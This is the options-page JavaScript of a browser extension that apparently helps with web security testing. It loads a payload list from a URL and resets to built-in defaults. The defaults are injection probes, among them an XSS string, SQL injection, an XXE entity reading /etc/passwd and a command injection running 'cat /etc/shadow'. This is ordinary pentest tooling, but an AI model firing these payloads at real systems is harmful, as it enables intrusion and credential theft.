var getJSON = function(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.responseType = 'json';
    xhr.onload = function() {
      var status = xhr.status;
      if (status === 200) {
        callback(null, xhr.response);
      } else {
        callback(status, xhr.response);
      }
    };
    xhr.send();
};

function saveOptions(e) {
    e.preventDefault();
    let link = document.querySelector("#link").value
    if (link === "") {
        alert("Error, link can't be empty!")
        return;
    }
    getJSON(link,
    function(err, data) {
      if (err !== null) {
        alert('Something went wrong: ' + err);
      } else {
        console.log("aaaaaaa")
        console.log(data)
        browser.storage.local.remove("payloads")
        browser.storage.local.set(data);
        alert('Updated');
        browser.runtime.reload()
      }
    });
  }
  
document.querySelector("form").addEventListener("submit", saveOptions);
document.getElementById("reset").addEventListener("click", function() {
    browser.storage.local.set({
        "payloads": [
          {"title": "XSS",
            "id": "xss",
            "payload": "<img src=1 onerror=alert()>"
          },
          {"title": "Simple quote SQLi",
            "id": "simple-sqli",
            "payload": "' or 1=1;-- "
          },
          {"title": "Double quote SQLi",
            "id": "double-sqli",
            "payload": "\" or 1=1;-- "
          },
          {"title": "Template Injection",
            "id": "template-injection",
            "payload": "${7*7}"
          },
          {"title": "XXE read file",
            "id": "xxe-read-file",
            "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
          },
          {"title": "LDAP Injection",
            "id": "ldap",
            "payload": "*()|&'"
          },
          {"title": "Command injection",
            "id": "Command",
            "payload": "; cat /etc/shadow"
          }
        ]
      });
      alert('Reset Done!');
      browser.runtime.reload()
});   



